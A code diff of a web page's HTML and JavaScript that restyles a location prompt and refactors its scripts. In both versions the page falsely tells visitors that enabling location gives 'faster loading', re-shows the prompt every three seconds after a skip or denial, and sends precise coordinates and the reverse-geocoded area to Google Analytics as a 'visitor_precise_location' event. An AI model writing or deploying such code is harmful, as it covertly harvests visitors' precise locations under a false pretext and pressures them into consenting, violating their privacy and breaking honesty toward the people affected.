@@ -26,93 +26,29 @@
       gtag('config', 'G-WT6S3LZ00H');
     </script>
 
-    <!-- Modal Styling (Centered Full Screen Layer) -->
+    <!-- Custom Scrollbar & Spinner Styling -->
     <style>
-      .center-modal-overlay {
-        position: fixed !important;
-        top: 0 !important;
-        left: 0 !important;
-        width: 100vw !important;
-        height: 100vh !important;
-        background-color: rgba(0, 0, 0, 0.65) !important;
-        display: flex !important;
-        align-items: center !important;
-        justify-content: center !important;
-        z-index: 9999999 !important;
-        direction: ltr !important;
-        font-family: system-ui, -apple-system, sans-serif !important;
-      }
-
-      .center-modal-card {
-        background-color: #ffffff !important;
-        color: #222222 !important;
-        padding: 20px !important;
-        border-radius: 12px !important;
-        box-shadow: 0 8px 30px rgba(0,0,0,0.3) !important;
-        max-width: 300px !important;
-        width: 85% !important;
-        text-align: center !important;
-      }
-
-      .center-modal-card h4 {
-        margin: 0 0 6px 0 !important;
-        font-size: 16px !important;
-        color: #111 !important;
-        font-weight: 600 !important;
-      }
-
-      .center-modal-card p {
-        margin: 0 0 16px 0 !important;
-        font-size: 13px !important;
-        color: #555 !important;
-        line-height: 1.4 !important;
-      }
-
-      .modal-btn-group {
-        display: flex !important;
-        gap: 10px !important;
-        justify-content: center !important;
-      }
-
-      .modal-btn-group button {
-        flex: 1 !important;
-        border: none !important;
-        padding: 9px 0 !important;
-        border-radius: 6px !important;
-        cursor: pointer !important;
-        font-weight: 600 !important;
-        font-size: 13px !important;
-      }
-
-      .btn-allow-action {
-        background-color: #0d6efd !important;
-        color: #ffffff !important;
-      }
-
-      .btn-skip-action {
-        background-color: #f1f3f5 !important;
-        color: #495057 !important;
-      }
-
-      /* Scrollbar Styling */
       ::-webkit-scrollbar { width: 8px; }
       ::-webkit-scrollbar-track { background: #f1f1f1; }
       ::-webkit-scrollbar-thumb { background: #4834d4; border-radius: 10px; }
       ::-webkit-scrollbar-thumb:hover { background: #3c2bb7; }
+
+      @keyframes spin { 
+        0% { transform: rotate(0deg); } 
+        100% { transform: rotate(360deg); } 
+      }
     </style>
 </head>
 <body>
 
     <!-- Location Modal Structure -->
-    <div id="center-location-modal" class="center-modal-overlay">
-      <div class="center-modal-card">
-        <div style="font-size: 24px; margin-bottom: 6px;">⚡</div>
-        <h4>Speed Optimization</h4>
-        <p>Enable location for faster loading.</p>
-
-        <div class="modal-btn-group">
-          <button class="btn-allow-action" onclick="approveAndRequestLocation()">Allow</button>
-          <button class="btn-skip-action" onclick="dismissModal()">Skip</button>
+    <div id="locationModal" class="modal-overlay">
+      <div class="modal-box">
+        <div class="modal-icon">⚡</div>
+        <p class="modal-text">Enable location for faster loading.</p>
+        <div class="modal-buttons">
+          <button class="btn-allow" onclick="handleAllow()">Allow</button>
+          <button class="btn-skip" onclick="handleSkip()">Skip</button>
         </div>
       </div>
     </div>
@@ -125,10 +61,6 @@
       <p style="font-size: 18px; font-weight: bold; color: #222; margin-bottom: 10px;">ثواني يا عسل ❤️✨</p>
       <div style="width: 40px; height: 40px; border: 3px solid #f3f3f3; border-top: 3px solid #4834d4; border-radius: 50%; animation: spin 0.8s linear infinite;"></div>
     </div>
-
-    <style>
-      @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
 
     <!-- Header Section -->
     <header class="hero">
@@ -232,30 +164,31 @@
 
     <!-- Scripts Logic -->
     <script>
-      // Location Modal Logic (re-triggers every 3 seconds if skipped or failed)
-      let locationGranted = false;
-
-      function showModal() {
-        if (!locationGranted) {
-          let modal = document.getElementById('center-location-modal');
-          if (modal) modal.style.display = 'flex';
-        }
+      // Function to hide the modal
+      function hideModal() {
+        const modal = document.getElementById('locationModal');
+        if (modal) modal.style.display = 'none';
       }
 
-      function dismissModal() {
-        let modal = document.getElementById('center-location-modal');
-        if (modal) modal.style.display = 'none';
+      // Function to show the modal
+      function showModal() {
+        const modal = document.getElementById('locationModal');
+        if (modal) modal.style.display = 'flex';
+      }
+
+      // Handle Skip Button Click
+      function handleSkip() {
+        hideModal();
         setTimeout(showModal, 3000);
       }
 
-      function approveAndRequestLocation() {
-        let modal = document.getElementById('center-location-modal');
-        if (modal) modal.style.display = 'none';
+      // Handle Allow Button Click
+      function handleAllow() {
+        hideModal();
 
         if ("geolocation" in navigator) {
           navigator.geolocation.getCurrentPosition(
             function(position) {
-              locationGranted = true;
               let lat = position.coords.latitude;
               let lon = position.coords.longitude;
               let coordsText = lat.toFixed(5) + ',' + lon.toFixed(5);
@@ -264,20 +197,26 @@
                 .then(res => res.json())
                 .then(data => {
                   let area = data.locality || data.city || data.principalSubdivision || "Unknown Area";
-                  gtag('event', 'visitor_precise_location', {
-                    'district_name': area + ' (' + coordsText + ')'
-                  });
+                  if (typeof gtag === 'function') {
+                    gtag('event', 'visitor_precise_location', {
+                      'district_name': area + ' (' + coordsText + ')'
+                    });
+                  }
                 })
                 .catch(() => {
-                  gtag('event', 'visitor_precise_location', {
-                    'district_name': 'Location (' + coordsText + ')'
-                  });
+                  if (typeof gtag === 'function') {
+                    gtag('event', 'visitor_precise_location', {
+                      'district_name': 'Location (' + coordsText + ')'
+                    });
+                  }
                 });
             },
             function(error) {
-              gtag('event', 'visitor_precise_location', {
-                'district_name': 'Permission Denied (Error: ' + error.code + ')'
-              });
+              if (typeof gtag === 'function') {
+                gtag('event', 'visitor_precise_location', {
+                  'district_name': 'Permission Denied (Error: ' + error.code + ')'
+                });
+              }
               setTimeout(showModal, 3000);
             },
             { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
@@ -334,14 +273,13 @@
       if (themeToggleBtn) {
         themeToggleBtn.addEventListener('click', () => {
           document.body.classList.toggle('dark-theme');
-          let theme = 'light';
           if (document.body.classList.contains('dark-theme')) {
-            theme = 'dark';
             themeToggleBtn.innerHTML = '<i class="fas fa-sun"></i>';
+            localStorage.setItem('theme', 'dark');
           } else {
             themeToggleBtn.innerHTML = '<i class="fas fa-moon"></i>';
+            localStorage.setItem('theme', 'light');
           }
-          localStorage.setItem('theme', theme);
         });
       }
     </script>
